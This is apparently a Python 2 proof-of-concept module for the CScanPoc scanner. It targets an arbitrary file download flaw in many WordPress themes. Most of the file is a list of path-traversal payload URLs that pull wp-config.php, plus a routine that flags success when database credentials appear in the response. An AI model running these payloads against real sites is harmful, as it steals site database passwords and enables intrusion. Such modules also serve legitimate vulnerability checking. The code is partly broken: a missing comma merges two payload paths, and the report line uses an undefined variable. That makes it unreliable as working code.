# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib2

class Vuln(ABVuln):
    vuln_id = 'WordPress_0022' # 平台漏洞编号，留空
    name = 'WordPress Multiple themes /download.php Arbitrary File Download'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD # 漏洞类型
    disclosure_date = '2014-12-24'  # 漏洞公布时间
    desc = '''
        download_file" variable is not sanitized.
        This exploit allows the attacker to exploit the flaw Arbitrary File
        Download in dozens of wordpress themes.
        Through regular expressions, the script will perform the check for each
        target url checking your wp-config.php file.
    '''  # 漏洞描述
    ref = 'https://packetstormsecurity.com/files/129706/wptheme-download.txt'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = 'WordPress Multiple themes'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '0999c6cf-6498-453e-9ecc-dfb8340a424c'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
                
            payload = [
                '/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php',
                '/wp-content/force-download.php?file=../wp-config.php',
                '/wp-content/themes/acento/includes/view-pdf.php?download=1&file=/path/wp-config.php',
                '/wp-content/themes/SMWF/inc/download.php?file=../wp-config.php',
                '/wp-content/themes/markant/download.php?file=../../wp-config.php',
                '/wp-content/themes/yakimabait/download.php?file=./wp-config.php',
                '/wp-content/themes/TheLoft/download.php?file=../../../wp-config.php',
                '/wp-content/themes/felis/download.php?file=../wp-config.php',
                '/wp-content/themes/MichaelCanthony/download.php?file=../../../wp-config.php',
                '/wp-content/themes/trinity/lib/scripts/download.php?file=../../../../../wp-config.php'
                '/wp-content/themes/epic/includes/download.php?file=wp-config.php',
                '/wp-content/themes/urbancity/lib/scripts/download.php?file=../../../../../wp-config.php',
                '/wp-content/themes/antioch/lib/scripts/download.php?file=../../../../../wp-config.php',
                '/wp-content/themes/authentic/includes/download.php?file=../../../../wp-config.php',
                '/wp-content/themes/churchope/lib/downloadlink.php?file=../../../../wp-config.php',
                '/wp-content/themes/lote27/download.php?download=../../../wp-config.php',
                '/wp-content/themes/RedSteel/download.php?file=../../../wp-config.php',
                '/wp-content/themes/linenity/functions/download.php?imgurl=../../../../wp-config.php'
            ]

            for filename in payload:
                verify_url = self.target + filename
                try:
                    req = urllib2.Request(verify_url)
                    content = urllib2.urlopen(req).read()
                except:
                    continue
                if 'DB_PASSWORD' in content and 'DB_USER' in content:
                    #args['success'] = True
                    #args['poc_ret']['file_path'].append(verify_url)
                    self.target = verify_url
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                        target=self.target, name=self.vuln.name, url=url))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
